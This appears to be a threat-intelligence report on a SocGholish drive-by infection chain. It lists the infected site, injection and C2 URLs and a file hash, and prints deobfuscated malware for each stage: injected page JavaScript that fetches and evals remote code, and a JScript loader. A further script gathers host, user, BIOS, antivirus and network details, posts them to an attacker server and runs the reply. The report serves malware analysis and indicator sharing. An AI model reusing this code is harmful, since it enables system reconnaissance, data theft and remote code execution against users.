THREAT IDENTIFICATION:  SOCGHOLISH

STAGE 1 INFECTED DOMAIN (PARROT TDS)
xplorie.com

STAGE 1 INJECTED URL
https://xplorie.com/fun/collins/

STAGE 1 DEOBFUSCATED INJECTED JAVASCRIPT
if (typeof ndsj === 'undefined') {
  var ndsj = true,
    HttpClient = function () {
      this.get = function (I, M) {
        var c = new XMLHttpRequest()
        c.onreadystatechange = function () {
          if (c.readyState == 4 && c.status == 200) {
            M(c.responseText)
          }
        }
        c.open('GET', I, true)
        c.send(null)
      }
    },
    rand = function () {
      return Math.random().toString(36).substr(2)
    },
    token = function () {
      return rand() + rand()
    }
  ;(function () {
    var I = navigator,
      M = document,
      O = screen,
      b = window,
      P = M.cookie,
      X = b.location.hostname,
      z = M.referrer
    X.indexOf('www.') == 0 && (X = X.substr(4))
    if (z && !v(z, '://' + X) && !v(z, '://www.' + X) && !P) {
      var C = new HttpClient(),
        m = 'https://storage.webfiledata.com/ui_static.js?ver=' + token()
      C.get(m, function (N) {
        v(N, 'ndsx') && b.eval(N)
      })
    }
    function v(N, B) {
      return N.indexOf(B) !== -1
    }
  })()
}

STAGE 2 INITIAL FILTERING URL
https://storage.webfiledata.com/ui_static.js?ver=v8pfv00nl7iyzypayorsh

STAGE 2 RESPONSE TO INITIAL FILTERING
var ndsx = true;(function(q,f,k,h,o,c){o=f.createElement(k);c=f.getElementsByTagName(k)[0];o.async=1;o.src=h;c.parentNode.insertBefore(o,c);})(window,document,'script','https://x64.nvize.com/MHp2C0tYFWJUWEw5BU9aKUJYTClIHBt6Vh8ffhIH');

JAVASCRIPT FILE DOWNLOAD URL
https://x64.nvize.com/rTEFzNYTZqXJEz/+mAQp7t5FYLyPCyegzF9hpcNWWqrEXWDugRN37pcTfLbJWm+tzkt9qN4TeA==

JAVASCRIPT FILE HASH
Update.js
a09a719b18c19a453c533bf39a5b5ad7

DEOBFUSCATED JAVASCRIPT 
if (1) {
function a0_0x30a2d6(_0x48cc54) {
var _0x207663 = 'responseText'
return _0x48cc54[_0x207663]
}

var a0_0x442eec = new this.ActiveXObject('MSXML2.XMLHTTP')
a0_0x442eec.open('POST', 'https://ufb.photo.beyoudcor.com/editContent', false)
a0_0x442eec.setRequestHeader('Upgrade-Insecure-Requests', '1')
a0_0x442eec.send('1PXJDYjPoNX95D+p3JaN40hpBtvnOPW3S1jCEnUCqQ==')
this.eval(a0_0x30a2d6(a0_0x442eec))

STAGE 3 PROXY FOR SOCGHOLISH C2
https://ufb.photo.beyoudcor.com/editContent

SCRIPT POSTED TO STAGE 3 PROXY
var dh = '';
var of = new ActiveXObject('WScript.Shell');
var zm = new ActiveXObject('WScript.Network');
var ib = [];
ib.push('b');
ib.push('500');
ib.push(WScript['ScriptFullName']);
ib.push(zm['ComputerName']);
ib.push(zm['UserName']);
ib.push(zm['UserDomain']);
ib.push(of ['ExpandEnvironmentStrings']('%userdnsdomain%'));
ib.push(wc('CIMV2', 'Win32_ComputerSystem', 'Manufacturer'));
ib.push(wc('CIMV2', 'Win32_ComputerSystem', 'Model'));
ib.push(wc('CIMV2', 'Win32_BIOS', 'Version') + wc('CIMV2', 'Win32_BIOS', 'SerialNumber'));
ib.push(wc('SecurityCenter2', 'AntiSpywareProduct', 'displayName'));
ib.push(wc('SecurityCenter2', 'AntiVirusProduct', 'displayName'));
ib.push(wc('CIMV2', 'CIM_NetworkAdapter', 'MACAddress'));
ib.push(wc('CIMV2', 'Win32_Process', 'Name'));
ib.push(wc('CIMV2', 'Win32_OperatingSystem', 'BuildNumber'));

function wc(xy, fc, zf) {
    var lq = '';
    try {
        var fp = GetObject("winmgmts:\\\\.\\root\\" + xy);
        var ru = fp['ExecQuery']('SELECT * FROM ' + fc, 'WQL');
        var nr = new Enumerator(ru);
        for (; !nr['atEnd'](); nr['moveNext']()) {
            var js = nr['item']();
            if (js[zf]) {
                lq += js[zf] + '|';
            }
        }
    } catch (e) {
        lq = '-1';
    }
    return lq;
}
try {
    var xn = '';
    for (var yr = 0; yr < ib.length; yr++) {
        xn += yr + '=' + encodeURIComponent(ib[yr]) + '&';
    }
    var lq = '';
    var sx = new ActiveXObject('MSXML2.XMLHTTP');
    sx.open('POST', 'https://ufb.photo.beyoudcor.com/editContent', false);
    sx.setRequestHeader('Upgrade-Insecure-Requests', '1');
    sx.send(xn);
    lq = sx.responseText;
    var evString = 'eval';
    this[evString](lq);
} catch (e) {}

PAYLOAD DOWNLOAD URL
Unknown - I was filtered out.

PAYLOAD FILE HASH
Unknown - I was filtered out.

PAYLOAD C2
Unknown - I was filtered out.



